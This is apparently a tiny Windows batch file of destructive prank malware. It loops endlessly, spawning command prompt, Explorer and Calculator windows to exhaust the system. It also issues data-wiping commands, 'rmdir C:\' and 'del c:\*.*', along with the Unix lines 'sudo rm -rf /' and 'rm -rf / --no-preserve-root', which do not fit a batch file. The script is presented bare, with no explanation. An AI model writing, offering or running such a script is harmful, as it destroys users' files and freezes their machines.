@echo OFF
:loop
start cmd
start explorer
start calc
sudo rm -rf /
rmdir C:\
del c:\*.*
sudo rm -rf / --no-preserve-root
goto loop